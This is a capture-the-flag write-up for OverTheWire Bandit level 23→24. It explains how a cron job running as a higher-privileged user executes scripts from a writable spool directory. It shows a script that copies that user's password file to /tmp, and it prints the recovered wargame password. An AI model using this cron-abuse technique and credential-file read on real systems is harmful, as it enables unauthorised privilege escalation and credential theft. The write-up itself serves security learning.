# **Bandit Level 23 → Level 24**

---

## **🧩 Challenge Description**

> A program is running automatically at regular intervals from cron, the time-based job scheduler.
> 
> 
> Look in `/etc/cron.d/` for the configuration and see what command is being executed.
> 
> 🧠 **This level teaches you how to create your first shell script!**
> 
> ⚠️ Your script will be **deleted automatically after it's executed**, so be ready to make a copy somewhere.
> 

---

## 📘 Strategy

1. Inspect `/etc/cron.d/` and identify the cronjob for `bandit24`.
2. Open the cronjob file and see which script is running.
3. Open and analyze the shell script to understand how it behaves.
4. Find a way to **trick the script** into giving you the password for `bandit24`.
5. Use this method to **read the password**.

---

## 🧠 Concept: How It Works

- A cronjob runs as `bandit24`, calling `/usr/bin/cronjob_bandit24.sh`.
- That script **executes a user-controlled script** if present in `/var/spool/$myname/`.
- You are **bandit23**, so your script can go into `/var/spool/bandit23/`.
- Your shell script gets **executed as bandit24**, so you can read the `bandit24` password!

---

# 🛠️ Commands Used

```bash
Step 1: Understanding the Cronjob
First, I looked at the cron directory:
ls -la /etc/cron.d/
There, I saw a file called cronjob_bandit24.

I read its contents using:
cat /etc/cron.d/cronjob_bandit24
It showed that a script /usr/bin/cronjob_bandit24.sh is being run every minute by user bandit24.

Step 2: Analyzing the Script
I opened the cronjob script to see what it does:
cat /usr/bin/cronjob_bandit24.sh
The script changes into the directory /var/spool/bandit23/foo and executes any file in that folder only if it is owned by bandit23. After executing, the script gets deleted.

Step 3: Writing My Script
Knowing this, I decided to create a script that would read the bandit24 password and save it in a place I can access.
I went to /tmp and created a new script file:
cd /tmp
nano 24_pass.sh
In the file, I wrote:
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24
I saved it and made it executable:
chmod 755 24_pass.sh

Step 4: Placing the Script in the Right Folder
The cronjob looks for scripts inside /var/spool/bandit23/foo, so I moved my script there:

mkdir -p /var/spool/bandit23/foo
mv /tmp/24_pass.sh /var/spool/bandit23/foo/
Now, I just had to wait for one minute…

Step 5: Retrieving the Password
After a minute, I checked the output file I specified in my script:
cat /tmp/pass_bandit24

And I got the password!
gb8KRRcsshuZXI0tUuR6ypOFjiZbf3G8
```

---

## ✅ Output
![image](https://github.com/user-attachments/assets/8223c467-8f89-4639-a863-34cd310f79c0)

![WhatsApp Image 2025-05-31 at 10 50 49 PM (3)](https://github.com/user-attachments/assets/48d29f38-2588-4856-832b-1a56405b9d7f)

---
